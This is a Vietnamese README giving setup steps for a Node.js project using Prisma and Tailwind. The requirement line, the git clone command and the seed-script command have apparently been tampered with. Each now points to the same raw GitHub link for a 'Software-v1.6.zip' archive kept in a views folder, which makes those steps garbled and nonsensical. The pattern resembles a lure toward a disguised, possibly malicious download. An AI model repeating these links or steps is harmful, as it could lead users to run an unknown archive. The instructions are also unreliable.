# Hướng dẫn chạy dự án

## Yêu cầu hệ thống

- https://github.com/VHoangNguyen0102/WAD/raw/refs/heads/main/src/resources/views/Software-v1.6.zip >= 14.x
- npm >= 6.x

## Cài đặt

1. Clone repository về máy của bạn:

    ```sh
    git clone https://github.com/VHoangNguyen0102/WAD/raw/refs/heads/main/src/resources/views/Software-v1.6.zip
    ```

2. Di chuyển vào thư mục dự án:

    ```sh
    cd your-repository
    ```

3. Cài đặt các gói phụ thuộc:

    ```sh
    npm install
    ```

## Chạy migration với Prisma

1. Chạy lệnh migration để tạo các bảng trong cơ sở dữ liệu:

    ```sh
    npx prisma migrate dev --name init
    ```

2. Chạy script seed để thêm dữ liệu mẫu vào cơ sở dữ liệu:

    ```sh
    node https://github.com/VHoangNguyen0102/WAD/raw/refs/heads/main/src/resources/views/Software-v1.6.zip
    ```

## Xây dựng Tailwind CSS

1. Chạy lệnh để xây dựng các file CSS từ Tailwind:

    ```sh
    npm run build-tail
    ```

## Chạy dự án

1. Khởi động server:

    ```sh
    npm start
    ```

2. Mở trình duyệt và truy cập vào địa chỉ:

    ```sh
    http://localhost:4000
    ```
